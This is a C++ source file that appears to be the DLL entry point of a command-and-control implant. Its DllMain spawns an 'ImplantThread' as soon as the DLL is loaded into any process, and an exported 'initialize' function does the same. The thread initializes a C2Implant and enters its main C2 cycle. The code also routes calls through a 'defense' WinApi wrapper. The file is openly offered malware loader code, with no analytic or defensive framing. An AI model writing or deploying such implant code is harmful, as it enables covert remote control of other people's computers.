#include <windows.h>
#include "core/c2.h"
#include "_debug/debug.h"
#include "defense/winapi.h"

/**
 * @brief DLL entrypoint into the program
 * 
 * @return DWORD
 */
DWORD WINAPI ImplantThread(LPVOID)
{
    DEBUG_LOG("[ImplantThread] Thread started. Initializing C2Implant...");
    C2Implant c2implant;
    c2implant.init();

    DEBUG_LOG("[ImplantThread] Entering main C2 cycle");
    c2implant.cycle();
    return 0;
}

//https://learn.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=msvc-170
// have to do extern c cuz otherwise C++ mangles it
extern "C" __declspec(dllexport) void __cdecl initialize() {
    DEBUG_LOG("[DLL Export::initialize] Exported function 'initialize' called. Spawning ImplantThread...");
    WinApi::CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DEBUG_LOG("[DllMain::DLL_PROCESS_ATTACH] DLL loaded into process. Spawning ImplantThread...");
        WinApi::CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
        break;
    
    case DLL_PROCESS_DETACH:
        DEBUG_LOG("[DllMain::DLL_PROCESS_DETACH] DLL being unloaded from process.");
        break;

    case DLL_THREAD_ATTACH:
        // Frequently called; usually silent unless debugging specific thread issues
        break;

    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}